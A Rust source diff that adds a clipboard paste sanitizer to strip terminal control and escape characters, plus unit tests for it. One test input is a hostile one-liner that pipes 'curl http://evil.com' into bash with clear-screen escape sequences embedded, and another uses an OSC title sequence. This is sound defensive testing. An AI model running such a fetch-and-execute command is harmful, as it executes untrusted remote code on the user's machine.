@@ -709,6 +709,46 @@ fn json_unescape(input: &str) -> Result<String, String> {
 }
 
 // ============================================================================
+// Paste content sanitization
+// ============================================================================
+
+/// Sanitize clipboard paste content by stripping dangerous control characters.
+///
+/// Removes characters that could inject terminal escape sequences when pasted:
+/// - C0 control characters (0x00-0x1F) **except** Tab (0x09), Newline (0x0A),
+///   and Carriage Return (0x0D) which are safe/expected in paste content
+/// - ESC (0x1B) is explicitly stripped to prevent escape sequence injection
+/// - C1 control characters (0x80-0x9F) including CSI (0x9B)
+///
+/// All normal printable ASCII, extended Latin, and Unicode text passes through
+/// unchanged.
+pub fn sanitize_paste_content(input: &str) -> String {
+    input
+        .chars()
+        .filter(|&ch| {
+            let code = ch as u32;
+            // Allow safe C0 controls: Tab, Newline, Carriage Return
+            if ch == '\t' || ch == '\n' || ch == '\r' {
+                return true;
+            }
+            // Strip C0 control characters (0x00-0x1F) — includes ESC (0x1B)
+            if code <= 0x1F {
+                return false;
+            }
+            // Strip DEL (0x7F)
+            if code == 0x7F {
+                return false;
+            }
+            // Strip C1 control characters (0x80-0x9F) — includes CSI (0x9B)
+            if (0x80..=0x9F).contains(&code) {
+                return false;
+            }
+            true
+        })
+        .collect()
+}
+
+// ============================================================================
 // Tests
 // ============================================================================
 
@@ -1121,5 +1161,109 @@ mod tests {
     fn test_invalid_url_encoding() {
         let result = transform("%ZZ", PasteTransform::DecodeUrl);
         assert!(result.is_err());
+    }
+
+    // ========================================================================
+    // Paste content sanitization tests
+    // ========================================================================
+
+    #[test]
+    fn test_sanitize_normal_text_unchanged() {
+        assert_eq!(sanitize_paste_content("Hello, world!"), "Hello, world!");
+        assert_eq!(
+            sanitize_paste_content("ls -la /tmp && echo done"),
+            "ls -la /tmp && echo done"
+        );
+        assert_eq!(
+            sanitize_paste_content("foo@bar.com 123 $HOME ~user"),
+            "foo@bar.com 123 $HOME ~user"
+        );
+    }
+
+    #[test]
+    fn test_sanitize_preserves_tab_newline_cr() {
+        // Tab, newline, and carriage return should be preserved
+        assert_eq!(sanitize_paste_content("a\tb"), "a\tb");
+        assert_eq!(sanitize_paste_content("line1\nline2"), "line1\nline2");
+        assert_eq!(sanitize_paste_content("line1\r\nline2"), "line1\r\nline2");
+        // All three together
+        assert_eq!(
+            sanitize_paste_content("col1\tcol2\nrow2\r\n"),
+            "col1\tcol2\nrow2\r\n"
+        );
+    }
+
+    #[test]
+    fn test_sanitize_strips_esc() {
+        // ESC (0x1B) starts escape sequences — must be stripped
+        assert_eq!(sanitize_paste_content("\x1b[31mred\x1b[0m"), "[31mred[0m");
+        // OSC sequence: ESC ] 0 ; title BEL
+        assert_eq!(
+            sanitize_paste_content("\x1b]0;evil title\x07"),
+            "]0;evil title"
+        );
+    }
+
+    #[test]
+    fn test_sanitize_strips_c0_controls() {
+        // NUL, BEL, BS, and other C0 controls should be stripped
+        assert_eq!(sanitize_paste_content("a\x00b"), "ab");
+        assert_eq!(sanitize_paste_content("a\x07b"), "ab"); // BEL
+        assert_eq!(sanitize_paste_content("a\x08b"), "ab"); // BS
+        assert_eq!(sanitize_paste_content("a\x01\x02\x03b"), "ab");
+        // SUB (0x1A) and others
+        assert_eq!(sanitize_paste_content("a\x1ab"), "ab");
+    }
+
+    #[test]
+    fn test_sanitize_strips_del() {
+        // DEL (0x7F) should be stripped
+        assert_eq!(sanitize_paste_content("a\x7fb"), "ab");
+    }
+
+    #[test]
+    fn test_sanitize_strips_c1_controls() {
+        // C1 control characters (0x80-0x9F) should be stripped
+        // CSI at 0x9B is especially dangerous
+        let csi = '\u{009B}';
+        let input = format!("a{}31mb", csi);
+        assert_eq!(sanitize_paste_content(&input), "a31mb");
+
+        // Other C1 characters
+        assert_eq!(sanitize_paste_content("a\u{0080}b"), "ab");
+        assert_eq!(sanitize_paste_content("a\u{0085}b"), "ab"); // NEL
+        assert_eq!(sanitize_paste_content("a\u{008D}b"), "ab"); // RI
+        assert_eq!(sanitize_paste_content("a\u{009F}b"), "ab");
+    }
+
+    #[test]
+    fn test_sanitize_preserves_unicode() {
+        // Unicode text should pass through unchanged
+        assert_eq!(
+            sanitize_paste_content("Hello \u{00A0}World"),
+            "Hello \u{00A0}World"
+        ); // NBSP (0xA0 — just above C1 range)
+        assert_eq!(sanitize_paste_content(""), "");
+        assert_eq!(
+            sanitize_paste_content("\u{4F60}\u{597D}"),
+            "\u{4F60}\u{597D}"
+        ); // Chinese: 你好
+        assert_eq!(sanitize_paste_content("caf\u{00E9}"), "caf\u{00E9}"); // café
+        assert_eq!(sanitize_paste_content("\u{1F600}"), "\u{1F600}"); // Emoji: 😀
+    }
+
+    #[test]
+    fn test_sanitize_empty_string() {
+        assert_eq!(sanitize_paste_content(""), "");
+    }
+
+    #[test]
+    fn test_sanitize_mixed_dangerous_and_safe() {
+        // Realistic attack: ESC sequence embedded in normal text
+        let malicious = "curl http://evil.com\x1b[2J\x1b[H | bash";
+        assert_eq!(
+            sanitize_paste_content(malicious),
+            "curl http://evil.com[2J[H | bash"
+        );
     }
 }
